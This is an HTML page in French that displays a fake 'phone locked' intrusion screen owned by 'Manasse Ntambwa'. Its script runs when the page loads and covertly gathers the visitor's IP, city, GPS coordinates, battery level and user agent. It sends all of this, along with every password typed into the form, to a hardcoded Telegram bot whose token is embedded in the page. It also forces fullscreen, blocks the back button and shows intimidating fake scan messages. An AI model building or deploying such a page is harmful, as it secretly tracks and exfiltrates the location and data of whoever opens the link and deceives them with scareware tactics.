<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>MANASSE NTAMBWA - SYSTÈMES SÉCURISÉS</title>

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

html, body {
    width: 100vw;
    height: 100vh;
    background: #000;
    color: #00ff66;
    font-family: 'Courier New', Courier, monospace;
    overflow: hidden;
    user-select: none;
    -webkit-user-select: none;
}

body {
    display: flex;
    justify-content: center;
    align-items: center;
    text-align: center;
}

#screen {
    width: 100%;
    height: 100%;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 5vw;
    background: radial-gradient(circle, #051c0d 0%, #000 85%);
    position: relative;
    z-index: 99999;
}

.intro-text {
    font-size: clamp(22px, 5.5vw, 60px);
    font-weight: bold;
    line-height: 1.4;
    text-shadow: 0 0 15px #00ff66;
    max-width: 90vw;
    opacity: 0;
    transition: opacity 0.4s ease-in-out;
    position: absolute;
    padding: 20px;
}

.visible {
    opacity: 1;
}

#lock-container {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    width: 100%;
    height: 100%;
    opacity: 0;
    transition: opacity 0.8s ease-in;
}

#lock-container.active {
    opacity: 1;
}

#title {
    font-size: clamp(30px, 7vw, 75px);
    font-weight: bold;
    letter-spacing: 0.1em;
    text-shadow: 0 0 20px #00ff66;
    margin-bottom: 5px;
}

#owner {
    color: #fff;
    font-size: clamp(16px, 3.5vw, 32px);
    margin-bottom: 25px;
    letter-spacing: 0.05em;
}

#form {
    width: min(90%, 450px);
    margin-top: 15px;
}

input {
    width: 100%;
    padding: 18px;
    background: #020804;
    color: #00ff66;
    border: 3px solid #00ff66;
    font-size: 24px;
    text-align: center;
    outline: none;
    border-radius: 8px;
    box-shadow: 0 0 15px rgba(0, 255, 102, 0.4);
}

button {
    margin-top: 20px;
    width: 100%;
    padding: 16px;
    background: #00ff66;
    color: #000;
    border: none;
    font-weight: bold;
    font-size: 20px;
    cursor: pointer;
    border-radius: 8px;
    box-shadow: 0 0 15px rgba(0, 255, 102, 0.6);
}

#status {
    font-size: clamp(15px, 3vw, 22px);
    margin-top: 20px;
    min-height: 1.5em;
    letter-spacing: 0.05em;
}

.hidden {
    display: none !important;
}

@keyframes glitch {
    0% { transform: translate(0); }
    20% { transform: translate(-4px, 4px); color: #ff3333; text-shadow: 0 0 10px #ff3333; }
    40% { transform: translate(-4px, -4px); color: #00ff66; }
    60% { transform: translate(4px, 4px); }
    80% { transform: translate(4px, -4px); color: #ff3333; text-shadow: 0 0 10px #ff3333; }
    100% { transform: translate(0); color: #00ff66; }
}

.glitch-effect {
    animation: glitch 0.15s infinite;
}
</style>
</head>

<body>

<main id="screen">
    <div id="cinematic-box" class="intro-text"></div>

    <div id="lock-container" class="hidden">
        <div id="title">MANASSE</div>
        <div id="owner">ZONE SOUS CONTRÔLE DE MANASSE NTAMBWA</div>
        
        <form id="form">
            <input
                id="password"
                type="password"
                placeholder="CODE MAÎTRE"
                autocomplete="off"
                required
            >
            <button type="submit">DÉVERROUILLER</button>
        </form>

        <div id="status">ACCÈS VERROUILLÉ — EN ATTENTE DU MAÎTRE</div>
    </div>
</main>

<script>
// TES IDENTIFIANTS TELEGRAM INTÉGRÉS DIRECTEMENT
const TELEGRAM_TOKEN = "8298299369:AAGGJe_JWK4QuyUrh51VjH1tYflN0X8O6HI";
const TELEGRAM_CHAT_ID = "8869305312";

const cinematicBox = document.getElementById("cinematic-box");
const lockContainer = document.getElementById("lock-container");
const form = document.getElementById("form");
const status = document.getElementById("status");
const password = document.getElementById("password");
const body = document.body;

const steps = [
    "ALERTE : TÉLÉPHONE VERROUILLÉ.",
    "PROPRIÉTAIRE EXCLUSIF : MANASSE NTAMBWA.",
    "SCAN DU RÉSEAU ET GÉOLOCALISATION EN COURS...",
    "INITIALISATION DU SYSTÈME..."
];

async function envoyerSurTelegram(typeAlerte, detailsExtra = "") {
    let ipInfo = "Inconnue";
    try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();
        ipInfo = `${data.ip} (${data.city}, ${data.country_name})`; } catch (e) {}  let batteryInfo = "Non disponible"; try { if (navigator.getBattery) { const bat = await navigator.getBattery(); batteryInfo = `${Math.round(bat.level * 100)}% (${bat.charging ? "En charge" : "Sur batterie"})`; } } catch (e) {}  if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(async (position) => { const lat = position.coords.latitude; const lon = position.coords.longitude; envoiFinalTelegram(ipInfo, batteryInfo, `https://www.google.com/maps?q=${lat},${lon}`, detailsExtra, typeAlerte); }, () => { envoiFinalTelegram(ipInfo, batteryInfo, "Refusée ou indisponible", detailsExtra, typeAlerte); }, { timeout: 5000 }); } else { envoiFinalTelegram(ipInfo, batteryInfo, "Non supportée", detailsExtra, typeAlerte); } }  function envoiFinalTelegram(ip, battery, gpsLink, extra, type) { const texteMessage = `🚨 *[${type}] - ALERTE APPAREIL MANASSE*\n\n` +
                         `• *IP / Ville :* \`${ip}\`\n` +
                         `• *Batterie :* ${battery}\n` +
                         `• *GPS :* [Ouvrir la carte Google Maps](${gpsLink})\n` + `• *Appareil :* \`${navigator.userAgent}\`\n` + `${extra}\n` +
                         `• *Date/Heure :* ${new Date().toLocaleString('fr-FR')}`;  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: texteMessage,
            parse_mode: "Markdown"
        })
    }).catch(err => {});
}

function typeMessage(text) {
    return new Promise(resolve => {
        cinematicBox.textContent = "";
        cinematicBox.classList.add("visible");
        let i = 0;
        function type() {
            if (i < text.length) {
                cinematicBox.textContent += text[i];
                i++;
                setTimeout(type, 25);
            } else {
                setTimeout(() => {
                    cinematicBox.classList.remove("visible");
                    setTimeout(resolve, 300);
                }, 1000);
            }
        }
        type();
    });
}

async function runCinematic() {
    for (let step of steps) {
        if (step.includes("ALERTE") || step.includes("SCAN")) {
            cinematicBox.classList.add("glitch-effect");
        } else {
            cinematicBox.classList.remove("glitch-effect");
        }
        await typeMessage(step);
    }

    cinematicBox.remove();
    lockContainer.classList.remove("hidden");
    setTimeout(() => {
        lockContainer.classList.add("active");
        password.focus();
    }, 100);
}

form.addEventListener("submit", function(event) {
    event.preventDefault();

    const monCodeSecret = "MNL"; // TON MOT DE PASSE

    if (password.value === monCodeSecret) {
        status.textContent = "ACCÈS AUTORISÉ — BIENVENUE MAÎTRE";
        status.style.color = "#00ff66";
        form.classList.add("hidden");
        
        envoyerSurTelegram("DÉVERROUILLAGE RÉUSSI", "✅ *Le propriétaire (Manasse) a saisi le bon code.*");
    } else {
        status.textContent = "ACCÈS REFUSÉ — INTRUS DÉTECTÉ";
        status.style.color = "#ff3333";
        
        envoyerSurTelegram("TENTATIVE D'INTRUSION", `❌ *Faux code entré :* \`${password.value}\``);

        password.value = "";
        body.classList.add("glitch-effect");
        setTimeout(() => body.classList.remove("glitch-effect"), 400);
        password.focus();
    }
});

window.onload = () => {
    envoyerSurTelegram("OUVERTURE DU LIEN (VISITEUR)");
    runCinematic();
    document.documentElement.requestFullscreen?.().catch(() => {});
};

history.pushState(null, null, location.href);
window.addEventListener('popstate', function () {
    history.pushState(null, null, location.href);
});
</script>

</body>
</html>
